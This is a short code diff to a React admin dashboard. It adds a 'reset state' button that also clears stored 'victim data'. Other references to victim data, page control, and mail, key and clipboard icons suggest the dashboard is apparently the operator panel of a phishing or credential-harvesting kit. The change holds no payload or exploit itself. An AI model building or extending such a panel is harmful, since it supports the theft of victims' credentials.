@@ -18,7 +18,7 @@ import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
 import { Separator } from "@/components/ui/separator";
 import { Badge } from "@/components/ui/badge";
-import { RefreshCw, Trash2, UserCircle, Moon, Sun, ShieldQuestion, CheckCircle2, AlertCircle, Mail, KeyRound, Forward, Eye, Clipboard, Type } from "lucide-react";
+import { History, Trash2, UserCircle, Moon, Sun, ShieldQuestion, CheckCircle2, AlertCircle, Mail, KeyRound, Forward, Eye, Clipboard, Type } from "lucide-react";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { useTheme } from "next-themes";
 import {
@@ -216,6 +216,23 @@ export function AdminDashboard() {
     }
   };
 
+  const handleResetState = async () => {
+    if (window.confirm("Are you sure you want to reset all state? This will restore the initial configuration and clear all victim data.")) {
+      try {
+        await fetch("/api/state", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ action: "reset" }),
+        });
+        toast({ title: "State Reset", description: "The application state has been restored to default." });
+        fetchState();
+      } catch (error) {
+        toast({ variant: "destructive", title: "Error", description: "Could not reset state." });
+      }
+    }
+  };
+
+
   const handleControlClick = async (page: string) => {
     try {
       await fetch('/api/state', {
@@ -311,7 +328,7 @@ export function AdminDashboard() {
                         </DropdownMenuItem>
                       </DropdownMenuContent>
                     </DropdownMenu>
-                    <Button variant="outline" size="icon" onClick={fetchState}><RefreshCw className="h-4 w-4" /></Button>
+                    <Button variant="outline" size="icon" onClick={handleResetState}><History className="h-4 w-4" /></Button>
                     <Button variant="destructive" size="icon" onClick={handleClearVictimData} disabled={activeTab !== 'data'}>
                         <Trash2 className="h-4 w-4" />
                     </Button>
@@ -584,4 +601,3 @@ export function AdminDashboard() {
 }
 
     
-
